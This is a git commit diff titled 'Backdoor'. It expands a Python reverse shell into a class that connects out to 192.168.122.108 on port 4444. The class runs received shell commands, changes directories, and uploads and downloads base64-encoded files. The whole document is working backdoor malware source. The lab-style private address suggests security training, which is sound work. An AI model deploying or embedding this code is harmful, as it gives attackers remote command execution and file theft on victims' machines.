e8b5a1102d0c4c6a50326bf1a43fe029016ea8a3
ninabarzh <30133030+ninabarzh@users.noreply.github.com>
2022-01-31 14:56:11 +0100

    Backdoor

--- backdoor/reverse_backdoor.py
+++ backdoor/reverse_backdoor.py
@@ -1,19 +1,73 @@
 #!/usr/bin/env python3
 
+import base64  # https://docs.python.org/3/library/base64.html
+import json  # https://docs.python.org/3/library/json.html
+import os  # https://docs.python.org/3/library/os.html
 import socket  # https://docs.python.org/3/library/socket.html
 import subprocess  # https://docs.python.org/3/library/subprocess.html
+import sys  # https://docs.python.org/3/library/sys.html
 
 
-def execute_system_commmand(command):
-    return subprocess.check_output(command, shell=True)
+class Backdoor:
+    def __init__(self, ip, port):
+        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        self.connection.connect((ip, port))
+
+    def reliable_send(self, data):
+        json_data = json.dumps(data)
+        self.connection.send(json_data)
+
+    def reliable_receive(self):
+        json_data = ""
+        while True:
+            try:
+                json_data = json_data + str(self.connection.recv(1024))
+                return json.loads(json_data)
+            except ValueError:
+                continue
+
+    def execute_system_commmand(self, command):
+        return subprocess.check_output(command, shell=True)
+
+    def change_working_directory_to(self, path):
+        os.chdir(path)
+        return "[+] Change working directory to " + path
+
+    def write_file(self, path, content):
+        with open(path, "wb") as file:
+            file.write(base64.b64decode(content))
+            return "[+] Upload Succesful"
+
+    def read_file(self, path):
+        with open(path, "rb") as file:
+            return base64.b64encode(file.read())
+
+    def run(self):
+        while True:
+            command = self.reliable_receive()
+
+            # noinspection PyBroadException
+            try:
+                if command[0] == "exit":
+                    self.connection.close()
+                    sys.exit()
+                elif command[0] == "cd" and len(command) > 1:
+                    command_result = self.change_working_directory_to(command[1])
+                elif command[0] == "download":
+                    command_result = self.read_file(command[1])
+                elif command[0] == "upload":
+                    command_result = self.write_file(command[1], command[2])
+
+                else:
+                    command_result = self.execute_system_commmand(command)
+
+            except Exception:
+                command_result = "[-] Error during command Execution"
+
+            self.reliable_send(command_result)
 
 
-connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-connection.connect(("192.168.122.108", 4444))
-
-while True:
-    command = connection.recv(4096)
-    command_result = execute_system_commmand(command.decode())
-    connection.send(command_result)
-
-connection.close()
+# Main
+if __name__ == "__main__":
+    my_backdoor = Backdoor("192.168.122.108", 4444)
+    my_backdoor.run()
